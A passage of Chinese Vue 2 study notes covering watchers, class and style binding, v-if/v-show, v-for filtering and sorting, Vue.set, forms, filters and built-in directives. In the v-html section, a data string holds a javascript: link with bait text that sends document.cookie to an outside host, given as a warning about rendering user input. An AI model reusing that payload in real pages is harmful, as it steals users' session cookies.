					//handler方法什么时候调用？当isHot发生改变时。
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				}
			} */
		})

		vm.$watch('isHot',{
			immediate:true, //初始化时让handler调用一下
			//handler什么时候调用？当isHot发生改变时。
			handler(newValue,oldValue){
				console.log('isHot被修改了',newValue,oldValue)
			}
		})
	</script>
```

watch里写要监视的参数：'参数'、'isHot'，这种可以去掉引号

**不加引号的前提**是：属性名必须满足变量取名的要求，如isHot就满足。（若该变量名掺杂有 . 和[ ] ，也就是说这种复杂一点的变量名都得加引号） 







### 4. 深度监视

watch检测对象numbers时候，检测的是这个numbers对象的地址值，**对象里面的一些值也许变了，但这个对象地址是没变的**，watch默认是检测不到他变化的。

那怎么办？

- 对于对象的具体值监视
  - `'numbers.a':{handler(){}}`
- **开启深度监视**对象任意部分发生变化
  - 'numbers.a':{**deep:true,**	handler(){}}





深度监视代码示例：

```html
	<body>
		<!-- 
			深度监视：
				(1).Vue中的watch默认不监测对象内部值的改变（一层）。
				(2).配置deep:true可以监测对象内部值改变（多层）。
			备注：
				(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
				(2).使用watch时根据数据的具体结构，决定是否采用深度监视。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
			<hr/>
			<h3>a的值是:{{numbers.a}}</h3>
			<button @click="numbers.a++">点我让a+1</button>
			<h3>b的值是:{{numbers.b}}</h3>
			<button @click="numbers.b++">点我让b+1</button>
			<button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
			{{numbers.c.d.e}}
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
				numbers:{
					a:1,
					b:1,
					c:{
						d:{
							e:100
						}
					}
				}
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			watch:{
				isHot:{
					// immediate:true, //初始化时让handler调用一下
					//handler什么时候调用？当isHot发生改变时。
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				},
				//监视多级结构中某个属性的变化
				/* 'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				} */
				//监视多级结构中所有属性的变化
				numbers:{
					deep:true,
					handler(){
						console.log('numbers改变了')
					}
				}
			}
		})

	</script>
```



### 5. 简写监视（略）

简写个寂寞，没啥用。略

简写前提是，监视里没有其他语句，比如深度监听之类……

```html
		//简写
		 vm.$watch('isHot',(newValue,oldValue)=>{
			console.log('isHot被修改了',newValue,oldValue,this)
		}) 

```



# 三、Vue数据交互

## 3.1 动态改变class、style

想想有啥用？

比如适配不同的客户端？前端页面适配手机端？动态去判断改变。还有网页的夜间模式切换？

### 1. v-bind绑定class与style

> :class="xxx" 

xxx可以是字符串、对象、数组。
                    字符串写法：类名不确定，要动态获取。
                    对象的写法：适用于要绑定多个样式，个数不确定，名字也不确定。
                    数组的写法：适用于要绑定多个样式，个数确定，名字也确定，但不确定用不用。

> :style="styleObj"

即普通的绑定样式。在data写样式，注意关于CSS的参数名变小驼峰。比如font-size变成fontSize



源代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>绑定样式</title>
		<style>
            /*基本样式*/
			.basic{
				width: 400px;
				height: 100px;
				border: 1px solid black;
			}
			/*开心主题样式*/
			.happy{
				border: 4px solid red;;
				background-color: rgba(255, 255, 0, 0.644);
				background: linear-gradient(30deg,yellow,pink,orange,yellow);
			}
            /*难过主题样式*/
			.sad{
				border: 4px dashed rgb(2, 197, 2);
				background-color: gray;
			}
            /*正常主题样式*/
			.normal{
				background-color: skyblue;
			}

			.atguigu1{
				background-color: yellowgreen;
			}
			.atguigu2{
				font-size: 30px;
				text-shadow:2px 2px 10px red;
			}
			.atguigu3{
				border-radius: 20px;
			}
		</style>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
        绑定样式：
            1. class样式
                写法:class="xxx" xxx可以是字符串、对象、数组。
                    字符串写法适用于：类名不确定，要动态获取。
                    对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
                    数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
            2. style样式
                :style="{fontSize: xxx}"其中xxx是动态值。
                :style="[a,b]"其中a、b是样式对象。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
			<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
			<div class="basic" :class="classArr">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
			<div class="basic" :class="classObj">{{name}}</div> <br/><br/>

			<!-- 绑定style样式--对象写法 -->
			<div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
			<!-- 绑定style样式--数组写法 -->
			<div class="basic" :style="styleArr">{{name}}</div>
		</div>
	</body>
	<script type="text/javascript">
		Vue.config.productionTip = false
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				mood:'normal',
				classArr:['atguigu1','atguigu2','atguigu3'],
				classObj:{
					atguigu1:false,
					atguigu2:false,
				},
				styleObj:{
					fontSize: '40px',
					color:'red',
				},
				styleObj2:{
					backgroundColor:'orange'
				},
				styleArr:[
					{
						fontSize: '40px',
						color:'blue',
					},
					{
						backgroundColor:'gray'
					}
				]
			},
			methods: {
				changeMood(){
					const arr = ['happy','sad','normal']
					const index = Math.floor(Math.random()*3)
					this.mood = arr[index]
				}
			},
		})
	</script>
	
</html>
```



### 2. 条件渲染v-if、v-show

隐藏一个元素节点

| 语法                      | 说明                                                         |
| ------------------------- | ------------------------------------------------------------ |
| v-show="false"            | 底层是display:none;    单纯隐藏元素，节点还是存在的，切换频率高用show |
| v-if="false"              | 直接把元素DOM节点移除，适用于切换频率低的                    |
| 有if就有else if、else     | if、else if、else一起使用时，中间不能被其他元素打断，类似java，不能在条件语句中间掺杂其他代码打断if、else |
| `<template>  </template>` | 触发显示批量元素的时候，template节点会自己移除掉，不影响DOM结构 |



> template的示例：批量隐藏/显示

先看下图：

![image-20220528224440747](https://i0.hdslb.com/bfs/album/324f0d77d6822139957867d553f6ad6765a8c26a.png)

最好不要用`div`把他们包起来，会破坏他们的DOM结构。

用**template**就可以解决这个问题，触发显示批量元素的时候，template节点会自己移除，而不影响下面的三个节点



关键代码：

```vue
	<body>
		<!-- 
        条件渲染：
            1.v-if
                写法：
                    (1).v-if="表达式" 
                    (2).v-else-if="表达式"
                    (3).v-else="表达式"
                适用于：切换频率较低的场景。
                特点：不展示的DOM元素直接被移除。
                注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

            2.v-show
                写法：v-show="表达式"
                适用于：切换频率较高的场景。
                特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
                
            3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
			<!-- 使用v-show做条件渲染 -->
			<!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- 使用v-if做条件渲染 -->
			<!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- v-else和v-else-if -->
			<!-- <div v-if="n === 1">Angular</div>
			<div v-else-if="n === 2">React</div>
			<div v-else-if="n === 3">Vue</div>
			<div v-else>哈哈</div> -->

			<!-- v-if与template的配合使用 -->
			<template v-if="n === 1">
				<h2>你好</h2>
				<h2>尚硅谷</h2>
				<h2>北京</h2>
			</template>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:0
			}
		})
	</script>
```





## 3.2 v-for遍历

### 1. v-for遍历渲染

需要注意的是，v-for()括号内的**形参第一个是value值，第二个才是索引，顺序一定要遵守**

v-for到底写在哪个位置？  哪个元素是批量展示的就写在哪个，比如`<li></li>`

对于`:key`的用法和原理看下文

| 语法                                      | 说明                                                       |
| ----------------------------------------- | ---------------------------------------------------------- |
| v-for="(p,index) of persons" :key="index" | 遍历数组                                                   |
| v-for="(value,k) of car" :key="k"         | 遍历对象，自然对应就是key-value，不过这里顺序是value-key   |
| v-for="(char,index) of str" :key="index"  | 遍历字符串，字符串本质数组，一遍历就单独打印一个个字符char |
| v-for="(number,index) of 5" :key="index"  | 遍历次数，用得少，数字12345输出而已                        |



遍历数组、对象、字符串、指定次数的代码如下：

```html
	<body>
		<!-- 
        v-for指令:
            1.用于展示列表数据
            2.语法：v-for="(item, index) in xxx" :key="yyy"
            3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<ul>
				<li v-for="(p,index) of persons" :key="index">
					{{p.name}}-{{p.age}}
				</li>
			</ul>

			<!-- 遍历对象 -->
			<h2>汽车信息（遍历对象）</h2>
			<ul>
				<li v-for="(value,k) of car" :key="k">
					{{k}}-{{value}}
				</li>
			</ul>

			<!-- 遍历字符串 -->
			<h2>测试遍历字符串（用得少）</h2>
			<ul>
				<li v-for="(char,index) of str" :key="index">
					{{char}}-{{index}}
				</li>
			</ul>
			
			<!-- 遍历指定次数 -->
			<h2>测试遍历指定次数（用得少）</h2>
			<ul>
				<li v-for="(number,index) of 5" :key="index">
					{{index}}-{{number}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					],
					car:{
						name:'奥迪A8',
						price:'70万',
						color:'黑色'
					},
					str:'hello'
				}
			})
		</script>
```



### 2. key的唯一标识

v-for="(p,index) of persons" **:key="index"**

Vue本来自带有`index`作为唯一标识索引，有些场合你会用到，比如按顺序遍历出多个路由。此时你的:key="index"写的就是自带的index；

但是后端传来真实数据的时候，合格的后端程序员，也定会把他的唯一标识id传给你前端，这个时候你的:key="p.id"，就**得使用后端的**唯一标识id！



如果你执意用Vue自带索引，再进行特殊顺序插入的数据的时候，Vue的DOM顺序会重新顺序分配索引值。那样就会乱了，之前索引是1的，前面有人插进来，他的索引就会变成2了。但是唯一标识是后端的id，那就不怕了，你的id标识永远都不会变，无论怎样的顺序。



想搞懂至于为什么会乱？可以看下图，懂还得去看视频

![image-20220529001147040](https://i0.hdslb.com/bfs/album/d62d51415270879e2a0cdd168cc85b9da8c6576f.png)

![image-20220529001115027](https://i0.hdslb.com/bfs/album/7b6c05410ba12f1ca958da5b37d2f7a1a7e401ba.png)





### 3. JS等值运算符

| 等值检测运算符 | 说明                                                         |
| :------------- | :----------------------------------------------------------- |
| ==（相等）     | 比较两个操作数的值是否相等                                   |
| !=（不相等）   | 比较两个操作数的值是否不相等                                 |
| ===（全等）    | 比较两个操作数的**值是否相等**，同时检测它们的**类型是否相同** |
| !==（不全等）  | 比较两个操作数的值是否不相等，同时检测它们的类型是否不相同   |



### 4. v-for遍历+过滤

> filter函数：注意该过滤函数**返回的是一个全新的数组，要接收**

**作用**：使用它过滤数组的某些元素，返回剩下的元素

**原理**：filter是把传入的数据依次作用每个元素，然后**根据返回值是true或false**来进行保留或过滤；



例如：过滤出偶数，返回的arrListFilter数组就是偶数数组：

```js
 let arrList = [0, 1, 2, 3, 4, 5];
    let arrListFilter = arrList.filter(item => {
      return item % 2 == 0;
    });

//想过滤p.name ！== '张三'，直接return p.name ！== '张三'  就过滤了
```

> indexOf函数：

返回 **String 对象内**第一次出现子字符串的字符位置。若不存在则为-1。

任何字符串都包含空值，与字符串第一个字符下标一样，下标为0。



课堂代码：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表过滤</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<ul>
				<li v-for="(p,index) of filPerons" :key="index">
					{{p.name}}-{{p.age}}-{{p.sex}}
				</li>
			</ul>
		</div>
		<script type="text/javascript">
			Vue.config.productionTip = false
			
			//用watch实现
			//#region 
			/* new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					],
					filPerons:[]
				},
				watch:{
					keyWord:{
						immediate:true,
						handler(val){
							this.filPerons = this.persons.filter((p)=>{
								return p.name.indexOf(val) !== -1
							})
						}
					}
				}
			}) */
			//#endregion
			//用computed实现
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					]
				},
                //返回filPerons给v-for遍历
				computed:{
					filPerons(){
                        //p是一个对象object，p.name自然是字符串
                        //this.keyWord是用户输入的值，拿来过滤
						return this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
					}
				}
			}) 
		</script>
</html>
```



### 5. v-for+排序功能实现

> 注意：破坏了节点顺序，v-for的索引值必须绑定后端的**p.id**



>sort函数：不生成副本，**直接更改原来数组**

```js
//sort为默认为升序，即return为1时候。
//a-b，升序。
arr.sort(a,b){
    return a-b
}
////b-a，降序
arr.sort(a,b){
    return b-a
}

```



关键代码：

```html
<title>列表排序</title>
<script type="text/javascript" src="../js/vue.js"></script>

<div id="root">
  <h2>人员列表</h2>
  <input type="text" placeholder="请输入名字" v-model="keyWord">
  <button @click="sortType = 2">年龄升序</button>
  <button @click="sortType = 1">年龄降序</button>
  <button @click="sortType = 0">原顺序</button>
  <ul>
    <li v-for="(p,index) of filPersons" :key="p.id">
      {{p.name}}-{{p.age}}-{{p.sex}}
      <input type="text">
    </li>
  </ul>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false
  new Vue({
    el: '#root',
    data: {
      keyWord: '',
      sortType: 0, // 0原顺序 1降序 2升序
      persons: [
        { id: '001', name: '马冬梅', age: 30, sex: '女' },
        { id: '002', name: '周冬雨', age: 31, sex: '女' },
        { id: '003', name: '周杰伦', age: 18, sex: '男' },
        { id: '004', name: '温兆伦', age: 19, sex: '男' }
      ]
    },
    computed: {
      filPersons() {
        const arr = this.persons.filter((p) => {
          return p.name.indexOf(this.keyWord) !== -1
        })
        //判断一下是否需要排序
        if (this.sortType) {
          //为什么可以写p1，p2？写成a，b也行，这个sort函数知道是你这个arr数组的前和后的数据
          arr.sort((p1, p2) => {
            return this.sortType === 1 ? p2.age - p1.age : p1.age - p2.age
          })
        }
        return arr
      }
    }
  })
</script>
```



## 3.3 Vue监视底层

### 1. 更新的一个问题

我想把第一个对象的属性值都改改：
      会有更改不奏效的情况，如下代码所示：

```js
		methods: {
					updateMei(){
						this.persons[0].name = '马老师' //奏效
						this.persons[0].age = 50 //奏效
						this.persons[0].sex = '男' //奏效
                        //整条更改，没有检测到
						this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
                        
						//因为Vue中的数据里的数组是没用数据代理set和get的，因此直接对数组进行修改，并不奏效。
                        
					}
				}
```

### 2. Vue数据代理的底层

你的data数据里可以放对象，对象里再放对象的对象，对象放数组的对象，知道不是对象为止。

Vue都可加工处理，丢给_data，_data里边的setter、getter真正去实现处理，完了getter调用，前端获取到。

![image-20220605032848151](https://i0.hdslb.com/bfs/album/c265251bf96d0d8f7b3adaa1eb7ae76ae4732469.png)





### 3. Vue.set

- Vue.set (  this.student,'sex' ,   '男'  )     这个是Vue缔造者的set
- this.$set (  this.student,'sex' ,   '男'  )     这个是vm的set

> 作用：**响应式添加**数据，给data里的对象【如下school】，插入一个新的属性【如phone电话】，这样加之后phone也有setter和getter；
>
> 注意：但是set的对象不能是vm，也不是vm的根数据对象如data。
>
> ​		即：不能直接set一个跟school并列的属性，只能作用于school里面的属性，与name并列的。
>
> ​		想set一个跟school并列，直接给school再包一层对象就可以了！
>
>   ```JS
> 		data:{
> 				school:{
> 					name:'尚硅谷',
> 					address:'北京',
> 				}
>              }
>   ```



代码：

```html
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学校信息</h1>
			<h2>学校名称：{{school.name}}</h2>
			<h2>学校地址：{{school.address}}</h2>
			<h2>校长是：{{school.leader}}</h2>
			<hr/>
			<h1>学生信息</h1>
			<button @click="addSex">添加一个性别属性，默认值是男</button>
			<h2>姓名：{{student.name}}</h2>
			<h2 v-if="student.sex">性别：{{student.sex}}</h2>
			<h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
			<h2>朋友们</h2>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				school:{
					name:'尚硅谷',
					address:'北京',
				},
				student:{
					name:'tom',
					age:{
						rAge:40,
						sAge:29,
					},
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				}
			}
		})
	</script>
```



### 4. 如何更新数组

[上文更新的一个问题](###1. 更新的一个问题)，解决为如下：

方式①    `this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})`

方式②    `this.persons[0].name = 'lisi'`  奏效，这样可不是直接对数组

方式③    `Vue.set(this.student.persons[0],'name','lisi')`    无敌set也是奏效的

**因为Vue中的数据里的数组是没用数据代理set和get的，因此直接对数组进行修改，并不奏效。**

对此则要使用如下图数组的方法，**Vue有专门对以下数组的方法进行封装，加了set和get的数据代理。**这方法并不是原来数组自带的方法，而是升级版。这样一来就可更新视图的数据。

---

![image-20220605135801574](https://i0.hdslb.com/bfs/album/8f96da33ad284ed9697ad192fa938f4f1dc95354.png)



### 5. 数据劫持概念

你想修改对象的东西，Vue的数据代理一下劫持到，把你的修改丢进set、get进行操作，最后解析模板返回给视图。这便是**数据劫持**。



## 3.4 表单数据、v-model的三个修饰符

### 1. 表单数据

==**总结都看不懂了，可以先看下面代码：**==



| 含义                                     | 属性、方法                                                   |
| ---------------------------------------- | ------------------------------------------------------------ |
| 单选框                                   | radio，如`男<input type="radio" name="sex" v-model="userInfo.sex" value="male">` |
| 复选框                                   | checkbox，`学习<input type="checkbox" v-model="userInfo.hobby" value="study">` |
| 下拉框                                   | select，                                                     |
| 用于将JavaScript对象**转化为JSON字符串** | JSON.stringify()                                             |
| 用于将JSON字符串**转化为一个对象**       | JSON.parse()[]()                                             |

> 收集表单数据：
> 	        若：`<input type="text"/>`，则v-model收集的是value值，用户输入的就是value值。
> 	        若：`<input type="radio"/>`，则v-model收集的是value值，且要给标签配置value值。
> 	        若：`<input type="checkbox"/>`
> 	            1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值），如**是否同意协议**
> 	            2.配置input的value属性：**如选择你的多选选项**
> 	                (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
> 	                (2)v-model的初始值是数组，那么收集的的就是value组成的数组
> 	        **备注：v-model的三个修饰符：**
> 	            `v-model.lazy`：失去焦点再收集数据，不用你改一下数据我就收集
> 	            `v-model.number`：输入字符串转为有效的数字，配合`type='number'`
> 	            `v-model.trim`：对输入的内容过滤首尾空格，但是中间还能输入空格，如何解决？正则表达式校验？
>
> 
>
> **表单中的button标签默认类型是submit**，阻止表单默认行为就是  **阻止页面的跳转与刷新**，一刷新数据就没了，
>
> submit.prevent="demo"  #这个是事件修饰符的知识  [事件修饰符](###5. 事件修饰符)
>


代码：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>收集表单数据</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<form @submit.prevent="demo">
				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
				性别：
                <!-- 对于radio，v-model收集的是value值，且要给标签配置value值-->
				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
				爱好：
                <!-- 对于checkbox，没有配置input的value属性, v-model收集布尔值，但是这里配置了value属性，收集的是多选项构成的数组-->
				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
				<br/><br/>
				所属校区
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
				其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
                <!-- 对于checkbox，没有配置input的value属性, v-model收集布尔值-->
				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
				<button>提交</button>
			</form>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				userInfo:{
					account:'',
					password:'',
					age:18,
					sex:'female',
					hobby:[],
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
                    //把表单的数据转换为json字符串输出到控制台
					console.log(JSON.stringify(this.userInfo))
				}
			}
		})
	</script>
</html>
```



### 2. 过滤器

过滤器可写在**插值语法**和**v-bind**（很少用）里，v-model不能用过滤器。

在使用过滤器时，跟插的值都要用管道符隔开  `|` 

- **全局过滤器**：（写在script下的就是全局，组件化的时候要用，定义的过滤器可以给别人使用）

- **局部过滤器**：写在vm的`filter:{}`中

过滤器要不要都行，因为可以被计算属性和方法代替。



代码：使用了`day.js库`

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>过滤器</title>
		<script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="../js/dayjs.min.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>显示格式化后的时间</h2>
			<!-- 计算属性实现 -->
			<h3>现在是：{{fmtTime}}</h3>
			<!-- methods实现 -->
			<h3>现在是：{{getFmtTime()}}</h3>
			<!-- 使用局部过滤器 -->
			<h3>现在是：{{time | timeFormater}}</h3>
			<!-- 局部过滤器+传参 -->
			<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
            <!-- 写在v-bind里，很少用 -->
			<h3 :x="msg | mySlice">尚硅谷</h3>
		</div>

		<div id="root2">
            <!-- 使用全局过滤器 -->
			<h2>{{msg | mySlice}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		//全局过滤器：（过滤器名mySlice，回调函数）   括号内的函数当参数，这不就是回调函数吗，哈哈
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})
		
		new Vue({
			el:'#root',
			data:{
				time:1621561377603, //时间戳
				msg:'你好，尚硅谷'
			},
			computed: {
				fmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			methods: {
				getFmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			//局部过滤器
			filters:{
                //value就是过滤器默认接受的你的那个值time
                //ES6语法，调用者若没给str传参，则使用下面的参数YYYY年MM月DD日 HH:mm:ss，若传参了，则用他给str传的参数。覆盖掉这个YYYY年MM月DD日 HH:mm:ss。
				timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
					return dayjs(value).format(str)
				}
			}
		})
		new Vue({
			el:'#root2',
			data:{
				msg:'hello,atguigu!'
			}
		})
	</script>
</html>
```



## 3.5 内置指令

### v-text


向其所在的节点中渲染文本内容，并且div容器内的节点东西都会被替换掉，div里写啥都没用。读不出来


```html
<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
            //
			<div v-text="name"></div>
		</div>

name来自实例对象里的data根数据。
```



### v-html

向其所在的节点中渲染html内容，里边写有任何html的标签，都能被渲染读取成html。

如下的`str2`，会引起安全问题，不能建立在用户输入的内容上，cookie的讲解！

```html
	<body>
<div id="root">
			<div>你好，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
```

### v-pre

在哪个标签内添加`v-pre`，就告诉Vue不用来解析了，这里没有Vue的特殊语法，全是静态内容，可以加快编译速度。

```html
<body>
<div id="app">
  <p>{{message}}</p>
  <p v-pre>{{message}}</p>
</div>
</body>

<script>
  const app = new Vue({
    el:"#app",
    data:{
      message:"Hello dear,I am ChenZY!"
    }
  })
</script>

</html>
```



### v-cloak

`v-cloak`指令（没有值）：
1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
2.使用css配合**v-cloak可以解决网速慢时页面展示出{{xxx}}的问题**。如图，div容器没被Vue渲染。

![image-20220605203606414](https://i0.hdslb.com/bfs/album/b048939c0211413ad940c2d12a387796390014e1.png)


```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-cloak指令</title>
		<style>
            <!-- 选中所有标签里有v-cloak属性的html元素，设为display none-->
			[v-cloak]{
				display:none;
			}
		</style>
		<!-- 引入Vue -->
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
        <!-- Vue.js慢5s才显示，但是前面div容器却显示，不行，我不能让他出来，在那加v-cloak-->
		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
	</body>
	
	<script type="text/javascript">
		console.log(1)
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```



### v-once

```html
1.v-once所在节点在初次动态渲染后，就视为静态内容了。

2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能
```

![image-20220605204151637](https://i0.hdslb.com/bfs/album/488a7fe0e12958426ac734472d62b2c230f5cb0c.png)



```html
	<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-once>初始化的n值是:{{n}}</h2>
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
```



## 3.6 自定义指令

如v-for的这些指令，我要自己定义一些我自己的指令。自定义的指令写在directives:{}里边

### 函数式自定义指令

相当于下文的`对象式自定义指令`的【执行bind+update函数】

<img src="https://article.biliimg.com/bfs/article/ed4be6b066c621df0792762c8d7f2521e0c5e5fc.png" style="zoom:67%;" />

关键代码：v-big="n"    实现数字n翻10倍

```html
<body>
    <div id="root">
        <h2>{{n}}</h2>
        <h2 v-big="n">{{n}}</h2>
        <button @click="n++">点我n+1</button>
        
    </div>
</body>
    <script>
        new Vue({
            el:'#root',
            data:{
                n:1
            },
            directives:{
                big(element,binding){
                    element.innerText = binding.value*10
                }
            }
        })
    </script>
```

### 对象式自定义指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
        需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
        需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
        自定义指令总结：
            一、定义语法：
                (1).局部指令：
                    new Vue({
                        directives:{指令名:配置对象} 或 directives{指令名:回调函数}
                    }) 
                (2).全局指令：
                    Vue.directive(指令名,配置对象) 或 Vue.directive(指令名,回调函数)

            二、配置对象中常用的3个回调：
                (1).bind：指令与元素成功绑定时调用。
                (2).inserted：指令所在元素被插入页面时调用。
                (3).update：指令所在模板结构被重新解析时调用。

            三、备注：
                1.指令定义时不加v-，但使用时要加v-；
                2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>{{name}}</h2>
			<h2>当前的n值是：<span v-text="n"></span> </h2>
			<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
			<button @click="n++">点我n+1</button>
			<hr/>
			<input type="text" v-fbind:value="n">
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		//定义全局指令：指令名，{回调函数}
		/* Vue.directive('fbind',{
